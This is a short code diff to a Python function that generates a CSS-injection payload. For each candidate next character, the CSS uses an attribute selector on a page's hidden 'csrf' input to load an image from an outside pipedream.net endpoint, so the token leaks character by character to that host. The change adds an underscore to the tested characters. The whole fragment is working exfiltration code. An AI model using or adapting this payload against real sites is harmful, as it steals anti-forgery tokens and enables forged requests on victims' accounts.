@@ -69,7 +69,8 @@ def build_css(chars):
         input[name="csrf"][value^="'''+chars+'''6"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''6);} 
         input[name="csrf"][value^="'''+chars+'''7"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''7);} 
         input[name="csrf"][value^="'''+chars+'''8"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''8);} 
-        input[name="csrf"][value^="'''+chars+'''9"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''9);} 
+        input[name="csrf"][value^="'''+chars+'''9"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''9);}
+        input[name="csrf"][value^="'''+chars+'''_"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''_);} 
             ''') 
         file.close()
 
